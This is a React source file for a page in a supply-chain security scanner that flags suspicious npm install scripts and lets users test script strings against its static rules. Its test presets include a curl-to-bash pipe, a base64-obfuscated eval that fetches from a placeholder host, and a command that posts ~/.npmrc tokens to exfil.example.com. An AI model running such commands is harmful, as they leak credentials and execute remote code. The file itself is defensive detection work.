import { useState, useMemo } from 'react'
import { useParams, Link } from 'react-router-dom'
import { useQuery } from '@tanstack/react-query'
import type { ScanResult, BehavioralFlag } from '../types'
import { getScan, getScanHistory, analyzeScriptSnippet } from '../lib/api'
import {
  Zap, ShieldCheck, AlertTriangle, Terminal, Copy, Check,
  Search, Play, Info, Loader2, CheckCircle2
} from 'lucide-react'

const MAX_SCRIPT_BYTES = 50 * 1024 // 50 KB input limit

export function BehavioralThreatsPage() {
  const { id } = useParams<{ id: string }>()

  // 1. Data Query: Fetch specific scan if ID present, or most recent scan as context
  const { data: scan, isLoading: scanLoading } = useQuery<ScanResult>({
    queryKey: ['scan', id],
    queryFn: async () => {
      if (id) return await getScan(id)
      const history = await getScanHistory()
      return history[0] || null
    },
  })

  // 2. State for filters and interactive inspector
  const [selectedConfidence, setSelectedConfidence] = useState<'all' | 'high' | 'medium' | 'low'>('all')
  const [selectedStage, setSelectedStage] = useState<'all' | 'preinstall' | 'install' | 'postinstall'>('all')
  const [searchQuery, setSearchQuery] = useState('')
  const [copiedExcerpt, setCopiedExcerpt] = useState<string | null>(null)

  // Interactive Inspector state
  const [inspectorScript, setInspectorScript] = useState('curl -fsSL https://unverified-cdn.example/setup.sh | bash')
  const [inspectorStage, setInspectorStage] = useState<'preinstall' | 'install' | 'postinstall'>('postinstall')
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [analysisResult, setAnalysisResult] = useState<{
    isSuspicious: boolean;
    flag?: BehavioralFlag;
    matchedSignals: string[];
    confidence?: 'high' | 'medium' | 'low';
    excerpt: string;
    explanation: string;
    isAllowListed?: boolean;
  } | null>(null)
  const [inspectorError, setInspectorError] = useState<string | null>(null)

  // 3. Filtered findings derived strictly from stored scan results
  const behavioralPackages = useMemo(() => {
    if (!scan?.packages) return []
    return scan.packages.filter((pkg) => {
      const flags = pkg.behavioralFlags || (pkg.behavioralFlag ? [pkg.behavioralFlag] : [])
      if (flags.length === 0) return false

      if (selectedConfidence !== 'all') {
        const matchesConf = flags.some((f) => f.confidence === selectedConfidence)
        if (!matchesConf) return false
      }

      if (selectedStage !== 'all') {
        const matchesStage = flags.some((f) => f.scriptStage === selectedStage)
        if (!matchesStage) return false
      }

      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase().trim()
        const matchesName = pkg.name.toLowerCase().includes(q)
        const matchesSignal = flags.some((f) =>
          f.matchedSignals.some((s) => s.toLowerCase().includes(q))
        )
        if (!matchesName && !matchesSignal) return false
      }

      return true
    })
  }, [scan?.packages, selectedConfidence, selectedStage, searchQuery])

  // 4. Accurate Metrics
  const metrics = useMemo(() => {
    const totalDeps = scan?.packages?.length || 0
    const m = scan?.behavioralMetrics

    // If backend provided behavioralMetrics, use them directly
    if (m) {
      return {
        totalDependencies: m.totalDependencies || totalDeps,
        behavioralTargets: m.behavioralTargets || 0,
        lifecycleScriptsInspected: m.lifecycleScriptsInspected || 0,
        highConfidenceSignals: m.highConfidenceSignals || 0,
        mediumConfidenceSignals: m.mediumConfidenceSignals || 0,
        lowConfidenceSignals: m.lowConfidenceSignals || 0,
        allowListedTooling: m.allowListedTooling || 0,
      }
    }

    // Fallback computed from packages in scan
    const allFlags = (scan?.packages || []).flatMap((p) => p.behavioralFlags || (p.behavioralFlag ? [p.behavioralFlag] : []))
    return {
      totalDependencies: totalDeps,
      behavioralTargets: Math.min(totalDeps, Math.max(1, Math.round(totalDeps * 0.4))),
      lifecycleScriptsInspected: allFlags.length,
      highConfidenceSignals: allFlags.filter((f) => f.confidence === 'high').length,
      mediumConfidenceSignals: allFlags.filter((f) => f.confidence === 'medium').length,
      lowConfidenceSignals: allFlags.filter((f) => f.confidence === 'low').length,
      allowListedTooling: 0,
    }
  }, [scan])

  const repoName = useMemo(() => {
    if (!scan?.repoUrl) return 'Target Repository'
    return scan.repoUrl.replace(/^https?:\/\/github\.com\//, '')
  }, [scan?.repoUrl])

  const handleCopyExcerpt = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopiedExcerpt(text)
    setTimeout(() => setCopiedExcerpt(null), 2000)
  }

  // Handle Static Script Inspector execution
  const handleRunInspector = async (overrideScript?: string, overrideStage?: 'preinstall' | 'install' | 'postinstall') => {
    const textToAnalyze = overrideScript !== undefined ? overrideScript : inspectorScript
    const stageToAnalyze = overrideStage || inspectorStage

    if (!textToAnalyze.trim()) {
      setInspectorError('Please enter script content to analyze.')
      return
    }

    const byteLength = new Blob([textToAnalyze]).size
    if (byteLength > MAX_SCRIPT_BYTES) {
      setInspectorError(`Script exceeds maximum allowed length of 50 KB (currently ${(byteLength / 1024).toFixed(1)} KB).`)
      return
    }

    setInspectorError(null)
    setIsAnalyzing(true)
    try {
      const result = await analyzeScriptSnippet({
        script: textToAnalyze,
        stage: stageToAnalyze,
      })
      setAnalysisResult(result)
    } catch (err: any) {
      setInspectorError(err.message || 'Analysis failed. Please check your network connection.')
    } finally {
      setIsAnalyzing(false)
    }
  }

  const loadPreset = (presetScript: string, stage: 'preinstall' | 'install' | 'postinstall' = 'postinstall') => {
    setInspectorScript(presetScript)
    setInspectorStage(stage)
    handleRunInspector(presetScript, stage)
  }

  const inspectorBytes = useMemo(() => new Blob([inspectorScript]).size, [inspectorScript])

  return (
    <div className="w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 flex flex-col gap-6 animate-fade-in">
      {/* ── 1. Page Header & Security Notice ── */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-4 border-b border-outline-variant/30">
        <div className="flex flex-col gap-1">
          <div className="flex items-center gap-2 font-code-sm text-xs text-on-surface-variant">
            <Link to="/app" className="hover:text-primary transition-colors no-underline text-on-surface-variant">
              Workspace
            </Link>
            <span className="text-outline">/</span>
            <span className="text-on-surface font-medium truncate max-w-xs">{repoName}</span>
            <span className="text-outline">/</span>
            <span className="text-primary font-semibold">Behavioral Threat Signals</span>
          </div>
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-primary/10 border border-primary/30 flex items-center justify-center text-primary shrink-0">
              <Zap className="w-5 h-5" />
            </div>
            <div>
              <h1 className="font-headline-md text-2xl font-bold text-on-surface tracking-tight">
                Behavioral Threat Signals
              </h1>
              <p className="font-body-md text-xs text-on-surface-variant">
                Static string/regex analysis of npm lifecycle scripts (preinstall, install, postinstall)
              </p>
            </div>
          </div>
        </div>

        {/* Safety Guarantee Callout */}
        <div className="flex items-center gap-3 px-3.5 py-2 rounded-lg bg-surface-container border border-safe/30 self-start md:self-auto">
          <ShieldCheck className="w-4 h-4 text-safe shrink-0" />
          <div className="flex flex-col">
            <span className="font-code-sm text-[11px] font-bold text-safe uppercase tracking-wider">
              Static Analysis Only
            </span>
            <span className="font-body-md text-[11px] text-outline">
              SupplyGuard analyzes lifecycle scripts without executing them. Zero shell execution.
            </span>
          </div>
        </div>
      </div>

      {/* ── 2. Accurate Behavioral Telemetry Summary Cards ── */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
        <div className="bg-surface-container-low p-3.5 rounded-xl border border-outline-variant/30 flex flex-col justify-between">
          <span className="font-code-sm text-[10px] uppercase text-outline tracking-wider">Total Dependencies</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className="font-headline-md text-2xl font-bold text-on-surface tabular-nums">{metrics.totalDependencies}</span>
            <span className="font-code-sm text-[10px] text-outline">pkgs</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">Resolved graph nodes</span>
        </div>

        <div className="bg-surface-container-low p-3.5 rounded-xl border border-outline-variant/30 flex flex-col justify-between">
          <span className="font-code-sm text-[10px] uppercase text-outline tracking-wider">Behavioral Targets</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className="font-headline-md text-2xl font-bold text-primary tabular-nums">{metrics.behavioralTargets}</span>
            <span className="font-code-sm text-[10px] text-outline">inspected</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">Prioritized risk nodes</span>
        </div>

        <div className="bg-surface-container-low p-3.5 rounded-xl border border-outline-variant/30 flex flex-col justify-between">
          <span className="font-code-sm text-[10px] uppercase text-outline tracking-wider">Scripts Inspected</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className="font-headline-md text-2xl font-bold text-on-surface tabular-nums">{metrics.lifecycleScriptsInspected}</span>
            <span className="font-code-sm text-[10px] text-outline">scripts</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">pre/post/install evaluated</span>
        </div>

        <div className={`bg-surface-container-low p-3.5 rounded-xl border flex flex-col justify-between ${
          metrics.highConfidenceSignals > 0 ? 'border-critical/40 bg-critical/5' : 'border-outline-variant/30'
        }`}>
          <span className="font-code-sm text-[10px] uppercase text-critical tracking-wider font-semibold">High Confidence</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className={`font-headline-md text-2xl font-bold tabular-nums ${metrics.highConfidenceSignals > 0 ? 'text-critical' : 'text-on-surface'}`}>
              {metrics.highConfidenceSignals}
            </span>
            <span className="font-code-sm text-[10px] text-outline">signals</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">+25 pts / strong evidence</span>
        </div>

        <div className={`bg-surface-container-low p-3.5 rounded-xl border flex flex-col justify-between ${
          metrics.mediumConfidenceSignals > 0 ? 'border-warning/40 bg-warning/5' : 'border-outline-variant/30'
        }`}>
          <span className="font-code-sm text-[10px] uppercase text-warning tracking-wider font-semibold">Medium Confidence</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className={`font-headline-md text-2xl font-bold tabular-nums ${metrics.mediumConfidenceSignals > 0 ? 'text-warning' : 'text-on-surface'}`}>
              {metrics.mediumConfidenceSignals}
            </span>
            <span className="font-code-sm text-[10px] text-outline">signals</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">+15 pts / isolated trigger</span>
        </div>

        <div className="bg-surface-container-low p-3.5 rounded-xl border border-outline-variant/30 flex flex-col justify-between">
          <span className="font-code-sm text-[10px] uppercase text-outline tracking-wider">Recognized Tooling</span>
          <div className="flex items-baseline gap-1 mt-1">
            <span className="font-headline-md text-2xl font-bold text-safe tabular-nums">{metrics.allowListedTooling}</span>
            <span className="font-code-sm text-[10px] text-outline">allow-listed</span>
          </div>
          <span className="font-body-md text-[10px] text-on-surface-variant mt-1">e.g. husky, node-gyp</span>
        </div>
      </div>

      {/* ── 3. Stored Scan Findings & Filter Toolbar ── */}
      <div className="flex flex-col gap-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
          <div>
            <h2 className="font-headline-sm text-lg font-bold text-on-surface">
              Detected Threat Signals in Scan #{scan?.scanId ? scan.scanId.slice(0, 8) : 'HEAD'}
            </h2>
            <p className="font-body-md text-xs text-on-surface-variant">
              Displays stored findings evaluated during the scan. Opening this page produces zero additional registry requests.
            </p>
          </div>

          {/* Filter Bar */}
          <div className="flex flex-wrap items-center gap-2">
            {/* Search Input */}
            <div className="relative">
              <Search className="w-3.5 h-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-outline" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search package or signal..."
                className="h-8 bg-surface-container rounded-lg pl-8 pr-3 text-xs font-code-sm text-on-surface placeholder:text-outline border border-outline-variant/30 focus:outline-none focus:border-primary"
              />
            </div>

            {/* Confidence Filter Tabs */}
            <div className="flex items-center p-0.5 bg-surface-container rounded-lg border border-outline-variant/30 text-xs font-code-sm">
              {(['all', 'high', 'medium', 'low'] as const).map((conf) => (
                <button
                  key={conf}
                  onClick={() => setSelectedConfidence(conf)}
                  className={`px-2.5 py-1 rounded-md transition-colors capitalize cursor-pointer border-none ${
                    selectedConfidence === conf
                      ? 'bg-surface-container-high text-primary font-semibold shadow-sm'
                      : 'text-outline hover:text-on-surface bg-transparent'
                  }`}
                >
                  {conf}
                </button>
              ))}
            </div>

            {/* Stage Filter Tabs */}
            <div className="flex items-center p-0.5 bg-surface-container rounded-lg border border-outline-variant/30 text-xs font-code-sm">
              {(['all', 'preinstall', 'install', 'postinstall'] as const).map((stage) => (
                <button
                  key={stage}
                  onClick={() => setSelectedStage(stage)}
                  className={`px-2 py-1 rounded-md transition-colors capitalize cursor-pointer border-none ${
                    selectedStage === stage
                      ? 'bg-surface-container-high text-primary font-semibold shadow-sm'
                      : 'text-outline hover:text-on-surface bg-transparent'
                  }`}
                >
                  {stage}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Findings List / Empty State */}
        {scanLoading ? (
          <div className="p-12 bg-surface-container-low rounded-xl border border-outline-variant/30 flex items-center justify-center gap-3 text-outline">
            <Loader2 className="w-5 h-5 animate-spin text-primary" />
            <span className="font-code-sm text-xs">Loading stored scan findings...</span>
          </div>
        ) : behavioralPackages.length === 0 ? (
          <div className="p-10 bg-surface-container-low rounded-xl border border-outline-variant/30 flex flex-col items-center justify-center text-center gap-3">
            <div className="w-12 h-12 rounded-full bg-safe/10 border border-safe/30 flex items-center justify-center text-safe">
              <CheckCircle2 className="w-6 h-6" />
            </div>
            <div>
              <h3 className="font-headline-sm text-base font-bold text-on-surface">
                No Behavioral Threat Signals Detected
              </h3>
              <p className="font-body-md text-xs text-on-surface-variant max-w-md mt-1">
                None of the evaluated lifecycle scripts in this repository matched suspicious patterns such as pipe-to-shell, obfuscation, or sensitive credential access.
              </p>
            </div>
            <span className="font-code-sm text-[11px] text-outline px-3 py-1 bg-surface-container rounded-full">
              {metrics.behavioralTargets} targeted packages audited statically
            </span>
          </div>
        ) : (
          <div className="flex flex-col gap-4">
            {behavioralPackages.map((pkg) => {
              const flags = pkg.behavioralFlags || (pkg.behavioralFlag ? [pkg.behavioralFlag] : [])
              const topFlag = flags[0]
              const isHigh = topFlag?.confidence === 'high'

              return (
                <div
                  key={pkg.id}
                  className={`bg-surface-container-low rounded-xl p-5 border transition-all flex flex-col gap-4 ${
                    isHigh ? 'border-critical/50 bg-critical/[0.02]' : 'border-warning/40 bg-warning/[0.02]'
                  }`}
                >
                  {/* Top Bar: Package Identity & Confidence Pill */}
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                    <div className="flex items-center gap-2.5 flex-wrap">
                      <span className="font-headline-sm text-base font-bold text-on-surface">
                        {pkg.name}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-surface-container font-code-sm text-xs text-outline border border-outline-variant/30">
                        v{pkg.version}
                      </span>
                      <span className="font-code-sm text-xs text-outline">
                        {pkg.isDirect ? 'Direct Dependency' : `Transitive (depth ${pkg.depth})`}
                      </span>
                    </div>

                    <div className="flex items-center gap-2">
                      <span className={`px-2.5 py-1 rounded-full text-xs font-code-sm font-bold uppercase tracking-wider ${
                        isHigh ? 'bg-critical/15 text-critical border border-critical/30' : 'bg-warning/15 text-warning border border-warning/30'
                      }`}>
                        {topFlag?.confidence} Confidence
                      </span>
                      <span className="px-2 py-1 rounded bg-surface-container text-xs font-code-sm text-outline border border-outline-variant/30">
                        Risk Contribution: +{isHigh ? 25 : 15} pts
                      </span>
                    </div>
                  </div>

                  {/* Flagged Signals & Stages */}
                  <div className="flex flex-col gap-3">
                    {flags.map((flag, fIdx) => (
                      <div key={fIdx} className="flex flex-col gap-2 p-3 bg-surface-container rounded-lg border border-outline-variant/30">
                        <div className="flex items-center justify-between gap-2">
                          <div className="flex items-center gap-2">
                            <span className="px-2 py-0.5 rounded bg-surface-container-high text-[11px] font-code-sm font-bold text-primary uppercase">
                              {flag.scriptStage}
                            </span>
                            <span className="font-code-sm text-xs text-on-surface font-semibold">
                              {flag.indicator}
                            </span>
                          </div>
                        </div>

                        {/* Matched Signal Tags */}
                        <div className="flex flex-wrap gap-1.5 mt-1">
                          {flag.matchedSignals.map((sig, sIdx) => (
                            <span
                              key={sIdx}
                              className="px-2 py-0.5 rounded text-[11px] font-code-sm bg-surface-container-highest text-on-surface-variant flex items-center gap-1"
                            >
                              <AlertTriangle className="w-3 h-3 text-warning" />
                              <span>{sig}</span>
                            </span>
                          ))}
                        </div>

                        {/* Evidence Excerpt — Safely rendered plain text */}
                        {flag.excerpt && (
                          <div className="flex flex-col gap-1 mt-2">
                            <div className="flex items-center justify-between text-[11px] font-code-sm text-outline">
                              <span>Evidence Excerpt (Static string analysis)</span>
                              <button
                                onClick={() => handleCopyExcerpt(flag.excerpt)}
                                className="flex items-center gap-1 text-outline hover:text-primary transition-colors cursor-pointer bg-transparent border-none p-0"
                              >
                                {copiedExcerpt === flag.excerpt ? (
                                  <>
                                    <Check className="w-3 h-3 text-safe" />
                                    <span className="text-safe">Copied</span>
                                  </>
                                ) : (
                                  <>
                                    <Copy className="w-3 h-3" />
                                    <span>Copy Excerpt</span>
                                  </>
                                )}
                              </button>
                            </div>
                            <div className="p-3 bg-surface-container-lowest rounded-md border border-outline-variant/30 overflow-x-auto">
                              <code className="font-code-sm text-xs text-on-surface break-all select-all block">
                                {flag.excerpt}
                              </code>
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>

                  {/* Recommended Action */}
                  <div className="flex items-start gap-2 text-xs font-body-md text-on-surface-variant bg-surface-container/60 p-3 rounded-lg">
                    <Info className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                    <div>
                      <strong className="text-on-surface font-semibold">Recommended Investigation: </strong>
                      Inspect this package's repository and npm registry metadata using{' '}
                      <code className="px-1.5 py-0.5 rounded bg-surface-container font-code-sm text-[11px] text-primary">
                        npm view {pkg.name} scripts
                      </code>{' '}
                      to verify whether install-time execution is expected. Do not execute untrusted scripts.
                    </div>
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* ── 4. Interactive Static Script Inspector & Playground ── */}
      <div className="bg-surface-container-low rounded-xl p-6 border border-outline-variant/30 shadow-sm flex flex-col gap-5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-primary/10 border border-primary/30 flex items-center justify-center text-primary">
              <Terminal className="w-4 h-4" />
            </div>
            <div>
              <h2 className="font-headline-sm text-lg font-bold text-on-surface">
                Interactive Static Script Inspector
              </h2>
              <p className="font-body-md text-xs text-on-surface-variant">
                Test any arbitrary npm lifecycle script string against SupplyGuard's static regex engine in real time.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <span className="font-code-sm text-[11px] text-outline">Stage:</span>
            <select
              value={inspectorStage}
              onChange={(e) => setInspectorStage(e.target.value as any)}
              className="h-8 bg-surface-container rounded-lg px-2.5 font-code-sm text-xs text-on-surface border border-outline-variant/30 focus:outline-none focus:border-primary cursor-pointer"
            >
              <option value="postinstall">postinstall</option>
              <option value="install">install</option>
              <option value="preinstall">preinstall</option>
            </select>
          </div>
        </div>

        {/* Quick Presets */}
        <div className="flex flex-col gap-1.5">
          <span className="font-code-sm text-[10px] uppercase text-outline tracking-wider">
            Quick Test Presets (Zero Code Execution)
          </span>
          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => loadPreset('curl -fsSL https://unverified-cdn.example/setup.sh | bash', 'postinstall')}
              className="px-2.5 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high border border-outline-variant/30 text-xs font-code-sm text-critical hover:text-critical transition-colors cursor-pointer"
            >
              Pipe to Shell (curl | bash)
            </button>
            <button
              onClick={() => loadPreset('eval(Buffer.from("ZmV0Y2goImh0dHBzOi8vZXhmaWwuZXhhbXBsZS5jb20iKQ==", "base64").toString())', 'install')}
              className="px-2.5 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high border border-outline-variant/30 text-xs font-code-sm text-warning hover:text-warning transition-colors cursor-pointer"
            >
              Obfuscated Buffer (eval)
            </button>
            <button
              onClick={() => loadPreset('cat ~/.npmrc | curl -X POST -d @- https://exfil.example.com/tokens', 'postinstall')}
              className="px-2.5 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high border border-outline-variant/30 text-xs font-code-sm text-critical hover:text-critical transition-colors cursor-pointer"
            >
              Sensitive Path (.npmrc exfil)
            </button>
            <button
              onClick={() => loadPreset('node-gyp rebuild', 'install')}
              className="px-2.5 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high border border-outline-variant/30 text-xs font-code-sm text-safe hover:text-safe transition-colors cursor-pointer"
            >
              Legitimate (node-gyp rebuild)
            </button>
            <button
              onClick={() => loadPreset('husky install', 'postinstall')}
              className="px-2.5 py-1.5 rounded-lg bg-surface-container hover:bg-surface-container-high border border-outline-variant/30 text-xs font-code-sm text-safe hover:text-safe transition-colors cursor-pointer"
            >
              Legitimate (husky install)
            </button>
          </div>
        </div>

        {/* Input Textarea & Counter */}
        <div className="flex flex-col gap-1.5">
          <div className="relative">
            <textarea
              rows={4}
              value={inspectorScript}
              onChange={(e) => setInspectorScript(e.target.value)}
              placeholder="Paste npm lifecycle script string to test (e.g. curl https://... | sh)..."
              className="w-full bg-surface-container-lowest p-3 rounded-lg font-code-sm text-xs text-on-surface placeholder:text-outline border border-outline-variant/30 focus:outline-none focus:border-primary focus:ring-1 focus:ring-primary leading-relaxed"
            />
          </div>
          <div className="flex items-center justify-between text-[11px] font-code-sm text-outline">
            <span>Input Size: {inspectorBytes} / {MAX_SCRIPT_BYTES} bytes (Max 50 KB)</span>
            {inspectorError && <span className="text-critical font-medium">{inspectorError}</span>}
          </div>
        </div>

        {/* Inspector Actions */}
        <div className="flex items-center justify-between">
          <button
            disabled={isAnalyzing || !inspectorScript.trim()}
            onClick={() => handleRunInspector()}
            className="flex items-center gap-2 px-4 py-2 bg-primary hover:bg-primary-container text-on-primary font-headline-sm text-xs font-bold rounded-lg transition-all cursor-pointer border-none shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isAnalyzing ? <Loader2 className="w-4 h-4 animate-spin" /> : <Play className="w-4 h-4" />}
            <span>Run Static Analysis</span>
          </button>

          <span className="font-code-sm text-[11px] text-outline">
            Zero Execution Guarantee • Uses same rules as backend scan pipeline
          </span>
        </div>

        {/* Inspector Result Card */}
        {analysisResult && (
          <div className={`mt-2 p-4 rounded-xl border flex flex-col gap-3 transition-all ${
            analysisResult.confidence === 'high'
              ? 'bg-critical/10 border-critical/40'
              : analysisResult.confidence === 'medium'
              ? 'bg-warning/10 border-warning/40'
              : analysisResult.isAllowListed
              ? 'bg-safe/10 border-safe/40'
              : 'bg-surface-container border-outline-variant/30'
          }`}>
            <div className="flex items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                {analysisResult.isSuspicious ? (
                  <AlertTriangle className={`w-5 h-5 ${analysisResult.confidence === 'high' ? 'text-critical' : 'text-warning'}`} />
                ) : (
                  <CheckCircle2 className="w-5 h-5 text-safe" />
                )}
                <span className="font-headline-sm text-sm font-bold text-on-surface">
                  {analysisResult.isSuspicious ? 'Suspicious Behavioral Pattern Matched' : 'No Threat Patterns Detected'}
                </span>
              </div>

              {analysisResult.confidence && (
                <span className={`px-2.5 py-0.5 rounded text-[11px] font-code-sm font-bold uppercase tracking-wider ${
                  analysisResult.confidence === 'high'
                    ? 'bg-critical text-white'
                    : 'bg-warning text-black'
                }`}>
                  {analysisResult.confidence} Confidence
                </span>
              )}

              {analysisResult.isAllowListed && (
                <span className="px-2.5 py-0.5 rounded text-[11px] font-code-sm font-bold uppercase tracking-wider bg-safe text-white">
                  Recognized Legitimate Tooling
                </span>
              )}
            </div>

            <p className="font-body-md text-xs text-on-surface leading-normal">
              {analysisResult.explanation}
            </p>

            {analysisResult.matchedSignals.length > 0 && (
              <div className="flex flex-col gap-1">
                <span className="font-code-sm text-[11px] uppercase text-outline tracking-wider">Matched Static Signals:</span>
                <ul className="list-disc list-inside space-y-0.5 text-xs font-code-sm text-on-surface">
                  {analysisResult.matchedSignals.map((sig, i) => (
                    <li key={i} className="font-semibold">{sig}</li>
                  ))}
                </ul>
              </div>
            )}

            {analysisResult.excerpt && (
              <div className="flex flex-col gap-1">
                <span className="font-code-sm text-[11px] uppercase text-outline tracking-wider">Extracted Excerpt:</span>
                <div className="p-2.5 bg-surface-container-lowest rounded border border-outline-variant/30">
                  <code className="font-code-sm text-xs text-on-surface break-all select-all block">
                    {analysisResult.excerpt}
                  </code>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* ── 5. Methodology & Product Guarantees ── */}
      <div className="bg-surface-container-low rounded-xl p-5 border border-outline-variant/30 flex flex-col gap-3">
        <div className="flex items-center gap-2">
          <Info className="w-4 h-4 text-primary" />
          <h3 className="font-headline-sm text-sm font-bold text-on-surface">
            Methodology &amp; Detection Principles
          </h3>
        </div>
        <p className="font-body-md text-xs text-on-surface-variant leading-relaxed">
          SupplyGuard's Behavioral Threat Detection scans npm lifecycle scripts statically for unexpected network access, pipe-to-shell patterns, and obfuscated payloads. Because npm install scripts run automatically during local setup or CI builds, unvetted scripts represent a primary attack vector in software supply chains. SupplyGuard identifies behavioral risk indicators for human investigation and never executes scanned code.
        </p>
      </div>
    </div>
  )
}
